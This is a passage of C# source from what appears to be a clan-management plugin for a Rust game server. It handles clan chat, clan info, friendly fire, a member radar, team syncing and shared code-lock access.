            if (player.net.connection.authLevel >= authLevelDelete || player.net.connection.authLevel >= authLevelRename || player.net.connection.authLevel >= authLevelInvite || player.net.connection.authLevel >= authLevelKick || player.net.connection.authLevel >= authLevelPromoteDemote) sb.AppendLine($"<color={clanServerColor}>Server management</color>: {msg("helpconsole", current.Id)} <color={colorCmdUsage}>clans</color>");
            string openText = $"<color={colorTextMsg}>";
            string closeText = "</color>";
            string[] parts = sb.ToString().Split(new char[] {
'\n'
}
            , StringSplitOptions.RemoveEmptyEntries);
            sb = new StringBuilder();
            foreach (var part in parts)
            {
                if ((sb.ToString().TrimEnd().Length + part.Length + openText.Length + closeText.Length) > 1050)
                {
                    SendReply(player, openText + sb.ToString().TrimEnd() + closeText);
                    sb.Clear();
                }
                sb.AppendLine(part);
            }
            SendReply(player, openText + sb.ToString().TrimEnd() + closeText);
        }
        void cmdChatClanInfo(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (player.net.connection.authLevel < authLevelClanInfo)
            {
                PrintChat(player, "No access to this command.");
                return;
            }
            if (args == null || args.Length == 0)
            {
                PrintChat(player, "Please specify a clan tag.");
                return;
            }
            var Clan = findClan(args[0]);
            if (Clan == null)
            {
                PrintChat(player, string.Format(msg("clanNoExist", player.UserIDString), args[0]));
                return;
            }
            var sb = new StringBuilder();
            string Messages = pluginPrefixREBORNShow == true ? $"<size=14><color= {pluginPrefixREBORNColor}>REBORN\n</color></size>" : "\n";
            sb.Append($"<size=18><color={pluginPrefixColor}>{this.Title}</color></size>{Messages}");
            sb.AppendLine($"<color={colorTextMsg}>Detailed clan information for:");
            sb.AppendLine($"ClanTag:  <color={colorClanNamesOverview}>{Clan.tag}</color> ( Online: <color={colorClanNamesOverview}>{Clan.online}</color> / Total: <color={colorClanNamesOverview}>{Clan.total}</color> )");
            sb.AppendLine($"Description: <color={colorClanNamesOverview}>{Clan.description}</color>");
            sb.Append(string.Format(msg("memberon", player.UserIDString)));
            int n = 0;
            foreach (var memberId in Clan.members)
            {
                var op = this.covalence.Players.FindPlayerById(memberId.Key);
                if (op != null && op.IsConnected)
                {
                    if (n > 0) sb.Append(", ");
                    if (Clan.IsOwner(memberId.Key))
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanOwnerColor, op.Name));
                    }
                    else if (Clan.IsCouncil(memberId.Key))
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanCouncilColor, op.Name));
                    }
                    else if (Clan.IsModerator(memberId.Key))
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanModeratorColor, op.Name));
                    }
                    else
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanMemberColor, op.Name));
                    }
                    ++n;
                }
            }
            if (Clan.online == 0) sb.Append(" - ");
            sb.Append("</color>\n");
            bool offline = false;
            foreach (var memberId in Clan.members)
            {
                var op = this.covalence.Players.FindPlayerById(memberId.Key);
                if (op != null && !op.IsConnected)
                {
                    offline = true;
                    break;
                }
            }
            if (offline)
            {
                sb.Append(string.Format(msg("memberoff", player.UserIDString)));
                n = 0;
                foreach (var memberId in Clan.members)
                {
                    var p = this.covalence.Players.FindPlayerById(memberId.Key);
                    if (p != null && !p.IsConnected)
                    {
                        if (n > 0) sb.Append(", ");
                        if (Clan.IsOwner(memberId.Key))
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanOwnerColor, p.Name));
                        }
                        else if (Clan.IsCouncil(memberId.Key))
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanCouncilColor, p.Name));
                        }
                        else if (Clan.IsModerator(memberId.Key))
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanModeratorColor, p.Name));
                        }
                        else
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanMemberColor, p.Name));
                        }
                        ++n;
                    }
                }
                sb.Append("\n");
            }
            sb.AppendLine($"Time created: <color={colorClanNamesOverview}>{UnixTimeStampToDateTime(Clan.created)}</color>");
            sb.AppendLine($"Last change: <color={colorClanNamesOverview}>{UnixTimeStampToDateTime(Clan.updated)}</color>");
            SendReply(player, sb.ToString().TrimEnd());
        }
        void cmdChatClanchat(BasePlayer player, string command, string[] args)
        {
            if (player == null || args.Length == 0) return;
            var myClan = findClanByUser(player.UserIDString);
            if (myClan == null)
            {
                SendReply(player, string.Format(msg("notmember", player.UserIDString)));
                return;
            }
            if (clanChatDenyOnMuted)
            {
                var current = this.covalence.Players.FindPlayerById(player.UserIDString);
                var chk = Interface.CallHook("API_IsMuted", current);
                if (chk != null && chk is bool && (bool)chk)
                {
                    SendReply(player, string.Format(msg("clanchatmuted", player.UserIDString)));
                    return;
                }
            }
            var message = string.Join(" ", args);
            if (string.IsNullOrEmpty(message)) return;
            myClan.BroadcastChat(string.Format(msg("broadcastformat"), myClan.PlayerColor(player.UserIDString), player.net.connection.username, message));
            if (ConVar.Chat.serverlog) DebugEx.Log(string.Format("[CHAT] CLAN [{0}] - {1}: {2}", myClan.tag, player.net.connection.username, message), StackTraceLogType.None);
        }
        void cmdChatAllychat(BasePlayer player, string command, string[] args)
        {
            if (player == null || args.Length == 0) return;
            var myClan = findClanByUser(player.UserIDString);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", player.UserIDString)));
                return;
            }
            if (myClan.clanAlliances.Count == 0)
            {
                PrintChat(player, string.Format(msg("noactiveally", player.UserIDString)));
                return;
            }
            if (clanChatDenyOnMuted)
            {
                var current = this.covalence.Players.FindPlayerById(player.UserIDString);
                var chk = Interface.CallHook("API_IsMuted", current);
                if (chk != null && chk is bool && (bool)chk)
                {
                    SendReply(player, string.Format(msg("clanchatmuted", player.UserIDString)));
                    return;
                }
            }
            var message = string.Join(" ", args);
            if (string.IsNullOrEmpty(message)) return;
            foreach (var clanAllyName in myClan.clanAlliances)
            {
                var clanAlly = findClan(clanAllyName);
                if (clanAlly == null) continue;
                clanAlly.AllyBroadcastChat(string.Format(msg("allybroadcastformat"), myClan.tag, myClan.PlayerColor(player.UserIDString), player.net.connection.username, message));
            }
            myClan.AllyBroadcastChat(string.Format(msg("broadcastformat"), myClan.PlayerColor(player.UserIDString), player.net.connection.username, message));
            if (ConVar.Chat.serverlog) DebugEx.Log(string.Format("[CHAT] ALLY [{0}] - {1}: {2}", myClan.tag, player.net.connection.username, message), StackTraceLogType.None);
        }
        void cmdChatClanFF(BasePlayer player, string command, string[] args)
        {
            if (!enableFFOPtion || player == null) return;
            var myClan = findClanByUser(player.UserIDString);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", player.UserIDString)));
                return;
            }
            if (manuallyEnabledBy.Contains(player.userID))
            {
                manuallyEnabledBy.Remove(player.userID);
                PrintChat(player, string.Format(msg("clanffdisabled", player.UserIDString), colorClanFFOff));
                return;
            }
            else
            {
                manuallyEnabledBy.Add(player.userID);
                PrintChat(player, string.Format(msg("clanffenabled", player.UserIDString), colorClanFFOn));
                return;
            }
        }
        public bool HasFFEnabled(ulong playerid = 87040) => !enableFFOPtion ? false : !manuallyEnabledBy.Contains(playerid) ? false : true;
        public void ToggleFF(ulong playerId)
        {
            if (manuallyEnabledBy.Contains(playerId)) manuallyEnabledBy.Remove(playerId);
            else manuallyEnabledBy.Add(playerId);
        }
        void cmdChatClanRadar(BasePlayer player, string command, string[] args)
        {
            if (!enableClanRadar || player == null || (usePermissionClanRadar && !permission.UserHasPermission(player.UserIDString, permissionClanRadarUse))) return;
            var myClan = findClanByUser(player.UserIDString);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", player.UserIDString)));
                return;
            }
            if (player.GetComponent<ClanRadar>())
            {
                GameObject.Destroy(player.GetComponent<ClanRadar>());
                PrintChat(player, string.Format(msg("clanradardisabled", player.UserIDString)));
                activeRadarUsers.Remove(player.UserIDString);
                return;
            }
            ClanRadar radar = player.transform.GetOrAddComponent<ClanRadar>();
            radar.DoStart();
            PrintChat(player, string.Format(msg("clanradarenabled", player.UserIDString)));
        }
        [ProtoContract(ImplicitFields = ImplicitFields.AllFields)]
        class StoredData
        {
            public Dictionary<string, Clan> clans = new Dictionary<string, Clan>();
            public Int32 saveStamp = 0;
            public string lastStorage = string.Empty;
            public StoredData() { }
        }

        StoredData clanSaves = new StoredData();

        public class ChangeListed
        {
            public int Need { get; set; }
            public int Complete { get; set; }
        }

        public class MembersChangeList
        {
            public int Complete { get; set; }
        }

        public class PlayerStats
        {
            public int PlayerPoints = 0;
            public int Killed = 0;
            public int Death = 0;
            public int Suicide = 0;
            public int KilledHeli = 0;
			public int KilledTank = 0;
            public bool CupAuth = true;
            public bool CodeAuth = true;
            public bool TurretAuth = true;

            public Dictionary<string, int> GatherInfo = new Dictionary<string, int>()
            {
                 {"wood", 0 },
                { "stones", 0 },
                { "metal.ore", 0 },
                { "sulfur.ore", 0},
                { "hq.metal.ore", 0 },
                {"fat.animal", 0},
                {"cloth", 0},
                {"leather", 0},
                {"scrap", 0},
                {"gears", 0},
                {"techparts", 0},
                {"metalpipe", 0},
            };
        }
        [ProtoContract(ImplicitFields = ImplicitFields.AllFields)]
        public class Clan
        {
            public int ClanPoints = 0;
            public string tag;
            public string description;
            public string owner;
            public string ownerName;
            public string ClanAvatar;
            public string council;
            public int created;
            public int updated;



            [JsonIgnore, ProtoIgnore] public int online;
            [JsonIgnore, ProtoIgnore] public int total;
            [JsonIgnore, ProtoIgnore] public int mods;
            public List<string> moderators = new List<string>();
            public Dictionary<string, PlayerStats> members = new Dictionary<string, PlayerStats>();

            public Dictionary<string, int> invites = new Dictionary<string, int>();
            public List<string> clanAlliances = new List<string>();
            public List<string> invitedAllies = new List<string>();
            public List<string> pendingInvites = new List<string>();

            //TEAM

            [JsonIgnore]
            [ProtoIgnore]
            private string currentTeamLeader => owner;

            [JsonIgnore]
            [ProtoIgnore]
            private bool wasDisbanded = false;

            [JsonIgnore]
            [ProtoIgnore]
            private RelationshipManager.PlayerTeam _playerTeam;

            [JsonIgnore]
            [ProtoIgnore]
            public RelationshipManager.PlayerTeam PlayerTeam
            {
                get
                {
                    if (_playerTeam == null)
                        _playerTeam = RelationshipManager.ServerInstance.CreateTeam();

                    return _playerTeam;
                }
            }


            public void RemoveModerator(object obj)
            {
                string Id = GetObjectId(obj);
                moderators.Remove(Id);
            }

            private string GetObjectId(object obj)
            {
                if (obj is BasePlayer)
                    return (obj as BasePlayer).UserIDString;

                else if (obj is IPlayer)
                    return (obj as IPlayer).Id;

                return (string)obj;
            }

            internal void OnCreate()
            {
                OnUpdate();
                Interface.CallHook("OnClanCreate", tag);
            }

            public static int UnixTimeStampUTC()
            {
                return (int)DateTime.UtcNow.Subtract(Epoch).TotalSeconds;
            }

            internal void OnUpdate(bool hasChanges = true)
            {
                if (hasChanges)
                {
                    updated = UnixTimeStampUTC();
                    UpdateTeam();
                }

                UpdateOnline();


                Interface.CallHook("OnClanUpdate", tag);
            }

            private static DateTime Epoch = new DateTime(1970, 1, 1);

            public void DisbandTeam()
            {
                wasDisbanded = true;

                DestroyPlayerTeam();
            }

            internal void OnDestroy()
            {
                DestroyPlayerTeam();
                Interface.CallHook("OnClanDestroy", tag);
            }

            internal void OnUnload()
            {
                DestroyPlayerTeam();
            }

            internal void UpdateTeam()
            {
                if (!useRelationshipManager || wasDisbanded)
                    return;

                PlayerTeam.teamLeader = cc.disableManageFunctions || !cc.allowButtonKick ? 0UL : Convert.ToUInt64(owner);

                PlayerTeam.teamName = $"[{tag}]";

                for (int i = 0; i < PlayerTeam.members.Count; i++)
                {
                    ulong playerId = PlayerTeam.members[i];

                    if (!members.ContainsKey(playerId.ToString()))
                    {
                        PlayerTeam.RemovePlayer(playerId);

                        (BasePlayer.FindByID(playerId) ?? BasePlayer.FindSleeping(playerId))?.ClearTeam();

                        RelationshipManager.ServerInstance.playerToTeam.Remove(playerId);

                    }
                }

                foreach (var member in members)
                {
                    ulong playerId = ulong.Parse(member.Key);

                    BasePlayer player = BasePlayer.FindByID(playerId) ?? BasePlayer.FindSleeping(playerId);

                    if (!PlayerTeam.members.Contains(playerId))
                    {
                        RelationshipManager.ServerInstance.playerToTeam.Remove(playerId);

                        if (player != null)
                        {
                            player.ClearTeam();
                            PlayerTeam.AddPlayer(player);
                        }
                    }
                }
                PlayerTeam.MarkDirty();
            }

            void UpdateOnline()
            {
                var onlineCount = members.Where(p => BasePlayer.Find(p.Key) != null && BasePlayer.Find(p.Key).IsConnected).Count();
                online = onlineCount;
            }

            private void DestroyPlayerTeam()
            {
                if (_playerTeam != null)
                {
                    for (int i = _playerTeam.members.Count - 1; i >= 0; i--)
                    {
                        _playerTeam.RemovePlayer(_playerTeam.members[i]);
                    }
                }

                _playerTeam = null;
            }

            public string GetColoredName(string Id, string Name)
            {
                if (IsOwner(Id))
                    return $"<color={cc.clanOwnerColor}>{Name}</color>";

                else if (IsCouncil(Id) && !IsOwner(Id))
                    return $"<color={cc.clanCouncilColor}>{Name}</color>";

                else if (IsModerator(Id) && !IsOwner(Id))
                    return $"<color={cc.clanModeratorColor}>{Name}</color>";

                else return $"<color={cc.clanMemberColor}>{Name}</color>";
            }

            //*TEAM

            public IPlayer FindClanMember(string nameOrId)
            {
                IPlayer player = cc.covalence.Players.FindPlayer(nameOrId);
                if (members.ContainsKey(player.Id))
                    return player;
                return null;
            }

            [JsonIgnore]
            [ProtoIgnore]
            public List<BasePlayer> membersBasePlayer = new List<BasePlayer>();

            public void AddBasePlayer(BasePlayer basePlayer, bool flag = false)
            {
                if (!membersBasePlayer.Any((BasePlayer x) => x.UserIDString == basePlayer.UserIDString))
                {
                    membersBasePlayer.Add(basePlayer);
                }
                else
                {
                    membersBasePlayer.RemoveAll((BasePlayer x) => x.UserIDString == basePlayer.UserIDString);
                    membersBasePlayer.Add(basePlayer);
                }
            }

            public void RemoveBasePlayer(BasePlayer basePlayer, bool flag = false)
            {
                if (membersBasePlayer.Any((BasePlayer x) => x.UserIDString == basePlayer.UserIDString))
                {
                    membersBasePlayer.RemoveAll((BasePlayer x) => x.UserIDString == basePlayer.UserIDString);
                }
            }

            public BasePlayer GetBasePlayer(string Id)
            {
                BasePlayer lookup = membersBasePlayer.Find((BasePlayer x) => x.UserIDString == Id);
                if (lookup)
                    return lookup;

                lookup = RustCore.FindPlayerByIdString(Id);

                if (lookup)
                    AddBasePlayer(lookup);

                return lookup;
            }

            //Custom code

            public void SetModerator(object obj)
            {
                RemoveModerator(obj);
                string Id = GetObjectId(obj);
                moderators.Add(Id);
            }

            public Dictionary<string, Dictionary<string, ulong>> SkinList = new Dictionary<string, Dictionary<string, ulong>>();
            public Dictionary<string, ChangeListed> Change = new Dictionary<string, ChangeListed>()
            {
                ["wood"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 10000
                },
                ["stones"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 10000
                },
                ["metal.ore"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 10000
                },
                ["sulfur.ore"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 10000
                },
                ["hq.metal.ore"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 5000
                },
                ["fat.animal"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 3000
                },
                ["cloth"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 3000
                },
                ["leather"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 1000
                },

                ["scrap"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 1000
                },
                ["gears"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 1000
                },
                ["techparts"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 100
                },

                ["metalpipe"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 100
                },
            };


            public PlayerStats GetPlayerStats(string playerid)
            {
                if (!members.ContainsKey(playerid)) return null;
                else
                    return members[playerid];
            }

            public static Clan Create(string tag, string description, string ownerId, string owName, string URL)
            {
                var clan = new Clan()
                {
                    ClanPoints = 0,
                    tag = tag,
                    description = description,
                    owner = ownerId,
                    ClanAvatar = URL,
                    ownerName = owName,
                    created = cc.UnixTimeStampUTC(),
                    updated = cc.UnixTimeStampUTC(),
                    SkinList = new Dictionary<string, Dictionary<string, ulong>>()
                    {
                        ["wear"] = new Dictionary<string, ulong>()
                        {
                             { "metal.facemask", 0},
                             {"metal.plate.torso", 0 },
                             {"hoodie", 0 },
                             {"pants", 0 },
                             {"shoes.boots", 0 },
                             {"roadsign.kilt", 0 },
                        },
                        ["weapon"] = new Dictionary<string, ulong>()
                        {
                             { "rifle.ak", 0},
                             {"rifle.bolt", 0 },
                             {"lmg.m249", 0 },
                             {"rifle.lr300", 0 },
                             {"smg.thompson", 0 },
                             {"rifle.semiauto", 0 },
                        },
                    },
                    Change = new Dictionary<string, ChangeListed>()
                    {
                        ["wood"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["stones"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["metal.ore"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["sulfur.ore"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["hq.metal.ore"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 5000
                        },
                        ["fat.animal"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 3000
                        },
                        ["cloth"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 3000
                        },
                        ["leather"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 1000
                        },

                        ["scrap"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 1000
                        },
                        ["gears"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 1000
                        },
                        ["techparts"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 100
                        },

                        ["metalpipe"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 100
                        },
                    }
                };
                clan.members.Add(ownerId, new PlayerStats());
                return clan;
            }
            public bool IsOwner(string userId)
            {
                return userId == owner;
            }
            public bool IsCouncil(string userId)
            {
                return userId == council;
            }
            public bool IsModerator(string userId)
            {
                return moderators.Contains(userId);
            }
            public bool IsMember(string userId)
            {
                return members.ContainsKey(userId);
            }
            public bool IsInvited(string userId)
            {
                return invites.ContainsKey(userId);
            }
            public void BroadcastChat(string message)
            {
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null) continue;
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefix) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public void BroadcastLoc(string messagetype, string arg1 = "", string arg2 = "", string arg3 = "", string arg4 = "", string current = "")
            {
                string message = string.Empty;
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null || player.UserIDString == current) continue;
                    message = string.Format(cc.msg(messagetype, memberId.Key), arg1, arg2, arg3, arg4);
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefix) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public void AllyBroadcastChat(string message)
            {
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null) continue;
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefixAlly) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public void AllyBroadcastLoc(string messagetype, string arg1 = "", string arg2 = "", string arg3 = "", string arg4 = "")
            {
                string message = string.Empty;
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null) continue;
                    message = string.Format(cc.msg(messagetype, memberId.Key), arg1, arg2, arg3, arg4);
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefixAlly) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public string ColNam(string Id, string Name)
            {
                if (IsOwner(Id)) return $"<color={cc.clanOwnerColor}>{Name}</color>";
                else if (IsCouncil(Id) && !IsOwner(Id)) return $"<color={cc.clanCouncilColor}>{Name}</color>";
                else if (IsModerator(Id) && !IsOwner(Id)) return $"<color={cc.clanModeratorColor}>{Name}</color>";
                else return $"<color={cc.clanMemberColor}>{Name}</color>";
            }
            public string PlayerLevel(string userID)
            {
                if (IsOwner(userID)) return "Owner";
                if (IsCouncil(userID)) return "Council";
                if (IsModerator(userID)) return "Moderator";
                return "Member";
            }
            public string PlayerColor(string userID)
            {
                if (IsOwner(userID)) return cc.clanOwnerColor;
                if (IsCouncil(userID)) return cc.clanCouncilColor;
                if (IsModerator(userID)) return cc.clanModeratorColor;
                return cc.clanMemberColor;
            }
            public IPlayer GetIPlayer(string partialName)
            {
                ulong userID;
                IPlayer iplayer;
                if (partialName.Length == 17 && ulong.TryParse(partialName, out userID))
                {
                    iplayer = cc.covalence.Players.FindPlayer(partialName);
                    return iplayer;
                }
                if (invites.Count > 0) foreach (var imember in GetInvites())
                    {
                        if (imember.Name.Contains(partialName) || imember.Name.EndsWith(partialName))
                        {
                            iplayer = cc.covalence.Players.FindPlayerById(imember.Id);
                            return iplayer;
                        }
                    }
                var player = cc.rust.FindPlayerByName(partialName);
                if (player != null) return cc.covalence.Players.FindPlayerById(player.UserIDString);
                try
                {
                    var iply = cc.covalence.Players.FindPlayer(partialName);
                    if (iply is IPlayer) return iply;
                }
                catch
                {
                    var idplayer = cc.covalence.Players.FindPlayer(partialName);
                    if (idplayer != null) return idplayer;
                }
                return null;
            }
            public IPlayer GetIMember(string partialName)
            {
                ulong userID;
                IPlayer player = null;
                if (partialName.Length == 17 && ulong.TryParse(partialName, out userID))
                {
                    player = cc.covalence.Players.FindPlayer(partialName);
                    return player;
                }
                foreach (var imember in GetIMembers())
                {
                    if (imember.Name.Contains(partialName) || imember.Name.EndsWith(partialName))
                    {
                        player = cc.covalence.Players.FindPlayerById(imember.Id);
                        return player;
                    }
                }
                player = GetIPlayer(partialName);
                return player;
            }
            public List<IPlayer> GetIMembers()
            {
                List<IPlayer> export = new List<IPlayer>();
                foreach (var member in members)
                {
                    if (IsOwner(member.Key)) continue;
                    IPlayer player = cc.covalence.Players.FindPlayerById(member.Key);
                    if (player != null) export.Add(player);
                }
                return export;
            }
            public List<IPlayer> GetInvites()
            {
                List<IPlayer> export = new List<IPlayer>();
                foreach (var invited in invites)
                {
                    IPlayer player = cc.covalence.Players.FindPlayerById(invited.Key);
                    if (player != null) export.Add(player);
                }
                return export;
            }
            internal JObject ToJObject()
            {
                var obj = new JObject();
                obj["tag"] = tag;
                obj["description"] = description;
                obj["owner"] = owner;
                obj["council"] = council;
                var jmoderators = new JArray();
                foreach (var moderator in moderators) jmoderators.Add(moderator);
                obj["moderators"] = jmoderators;
                var jmembers = new JArray();
                foreach (var member in members) jmembers.Add(member.Key);
                obj["members"] = jmembers;
                var jallies = new JArray();
                foreach (var ally in clanAlliances) jallies.Add(ally);
                obj["allies"] = jallies;
                var jinvallies = new JArray();
                foreach (var ally in invitedAllies) jinvallies.Add(ally);
                obj["invitedallies"] = jinvallies;
                return obj;
            }
        }
        sealed class ClanRadar : FacepunchBehaviour
        {
            BasePlayer player;
            Clan clan;
            bool noAdmin;
            void Awake()
            {
                player = GetComponent<BasePlayer>();
                player.SetInfo("noRadarAdmin", !player.IsAdmin ? "1" : "2");
                noAdmin = !player.IsAdmin;
                clan = cc.findClanByUser(player.UserIDString);
            }
            public void DoStart()
            {
                CancelInvoke(DoRadar);
                if (!cc.activeRadarUsers.Contains(player.UserIDString)) cc.activeRadarUsers.Add(player.UserIDString);
                InvokeRepeating(DoRadar, 1f, cc.refreshTime);
            }
            void SetPlayerFlag(BasePlayer.PlayerFlags f, bool b)
            {
                if (b)
                {
                    if (player.HasPlayerFlag(f)) return;
                    player.playerFlags |= f;
                }
                else
                {
                    if (!player.HasPlayerFlag(f)) return;
                    player.playerFlags &= ~f;
                }
                player.SendNetworkUpdateImmediate(false);
            }
            void DoRadar()
            {
                if (player != null && (player.IsSleeping() || player.IsSpectating() || player.IsReceivingSnapshot)) return;
                if (player == null || !player.IsConnected || player.IsDead())
                {
                    DoDestroy();
                    return;
                }
                if (noAdmin) SetPlayerFlag(BasePlayer.PlayerFlags.IsAdmin, true);
                try
                {
                    foreach (BasePlayer targetplayer in cc.clanRadarMemberobjects[clan.tag].Where(p => p != null && p != player && !p.IsDead()).ToList())
                    {
                        float targetDist = Vector3.Distance(targetplayer.transform.position, player.transform.position);
                        bool inFullRange = targetDist < maxNamedistance && targetDist > minDistance;
                        bool inSleepRange = targetDist < maxSleeperDistance && targetDist > minDistance;
                        if (targetplayer.IsConnected && !targetplayer.IsSleeping() && inFullRange) player.SendConsoleCommand("ddraw.text", cc.refreshTime, UnityEngine.Color.grey, targetplayer.transform.position + playerHeight, $"<size={cc.radarTextSize}><color={cc.nameColor}>{targetplayer.displayName}</color> | <color={cc.distanceColor}>{Math.Floor(targetDist)}m</color></size>");
                        else if (cc.showSleepers && targetplayer.IsSleeping() && inSleepRange) player.SendConsoleCommand("ddraw.text", cc.refreshTime, UnityEngine.Color.grey, targetplayer.transform.position + sleeperHeight, $"<size={cc.radarTextSize}><color={cc.sleeperNameColor}>{targetplayer.displayName}</color> | <color={cc.distanceColor}>{Math.Floor(targetDist)}m</color></size>");
                    }
                    if (cc.enableClanAllies && cc.extendOnAllyMembers && clan.clanAlliances.Count > 0) foreach (var allyClan in clan.clanAlliances) foreach (BasePlayer targetplayer in cc.clanRadarMemberobjects[allyClan.ToString()].Where(p => p != null && p.IsConnected && !p.IsSleeping() && !p.IsDead()).ToList())
                            {
                                float targetDist = Vector3.Distance(targetplayer.transform.position, player.transform.position);
                                bool inFullRange = targetDist < maxNamedistance && targetDist > minDistance;
                                if (Vector3.Distance(targetplayer.transform.position, player.transform.position) < maxNamedistance && Vector3.Distance(targetplayer.transform.position, player.transform.position) > minDistance) player.SendConsoleCommand("ddraw.text", cc.refreshTime, UnityEngine.Color.grey, targetplayer.transform.position + playerHeight, $"<size={cc.radarTextSize}><color={cc.nameColor}>{targetplayer.displayName}</color> | <color={cc.distanceColor}>{Math.Floor(Vector3.Distance(targetplayer.transform.position, player.transform.position))}m</color></size>");
                            }
                }
                finally
                {
                    if (noAdmin) SetPlayerFlag(BasePlayer.PlayerFlags.IsAdmin, false);
                }
            }
            void DoDestroy()
            {
                CancelInvoke(DoRadar);
                Destroy(this);
            }
            void OnDestroy()
            {
                if (noAdmin) SetPlayerFlag(BasePlayer.PlayerFlags.IsAdmin, false);
                CancelInvoke(DoRadar);
            }
        }
        void RemoveRadar(BasePlayer player, string tag, bool leftOrKicked = false)
        {
            if (player != null && enableClanRadar)
            {
                GameObject.Destroy(player.GetComponent<ClanRadar>());
                activeRadarUsers.Remove(player.UserIDString);
                if (leftOrKicked && clanRadarMemberobjects.ContainsKey(tag)) clanRadarMemberobjects[tag].Remove(player);
            }
        }
        void RemoveRadarGroup(List<string> playerIds, string tag, bool isDisband = false)
        {
            if (!enableClanRadar) return;
            if (isDisband) clanRadarMemberobjects.Remove(tag);
            foreach (var playerId in playerIds)
            {
                BasePlayer player = rust.FindPlayerByIdString(playerId);
                if (player != null) RemoveRadar(player, tag, isDisband);
            }
        }
        [HookMethod("GetClan")]
        private JObject GetClan(string tag)
        {
            if (tag == null || tag == "") return null;
            var clan = findClan(tag);
            if (clan == null) return null;
            return clan.ToJObject();
        }

        [HookMethod("GetAllClans")]
        private JArray GetAllClans()
        {
            return new JArray(clans.Keys);
        }
        [HookMethod("GetClanOf")]
        private string GetClanOf(ulong player)
        {
            if (player == 0uL) return null;
            var clan = findClanByUser(player.ToString());
            if (clan == null) return null;
            return clan.tag;
        }
        [HookMethod("GetClanOf")]
        private string GetClanOf(string player)
        {
            if (player == null || player == "") return null;
            var clan = findClanByUser(player.ToString());
            if (clan == null) return null;
            return clan.tag;
        }
        [HookMethod("GetClanOf")]
        private string GetClanOf(BasePlayer player)
        {
            if (player == null) return null;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return null;
            return clan.tag;
        }
        [HookMethod("GetClanMembers")]
        private List<string> GetClanMembers(ulong PlayerID)
        {
            List<string> Players = new List<string>();
            var myClan = findClanByUser(PlayerID.ToString());
            if (myClan == null) return null;
            foreach (var it in myClan.members)
                Players.Add(it.Key);
            return Players;
        }


        object CanUseLockedEntity(BasePlayer player, BaseLock baseLock)
        {
            if (player == null || baseLock == null || baseLock.OwnerID == 0 || baseLock.OwnerID == player.userID) return null;
            if (baseLock.GetComponent<CodeLock>() == null || baseLock.GetComponent<CodeLock>().whitelistPlayers.Contains(player.userID)) return null;
            var inClan = HasFriend(baseLock.OwnerID, player.userID);
            if (inClan != null && (bool)inClan)
            {
                var clan = findClanByUser(baseLock.OwnerID.ToString());
                if (clan == null) return null;
                if (clan.GetPlayerStats(baseLock.OwnerID.ToString()) == null) return null;
                bool check = clan.GetPlayerStats(baseLock.OwnerID.ToString()).CodeAuth;
                if (check) return true;
            }
            return null;
        }

        void OnEntityBuilt(Planner plan, GameObject go)
        {
            if (plan == null || go == null) return;
            var player = plan.GetOwnerPlayer();
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null || !clan.GetPlayerStats(player.UserIDString).CupAuth) return;
            BaseEntity entity = go.ToBaseEntity();
            if (entity == null || entity.GetComponent<BuildingPrivlidge>() == null || !entity.ShortPrefabName.Contains("cupboard")) return;
            var cup = entity.GetComponent<BuildingPrivlidge>();
            foreach (var member in clan.members)
            {
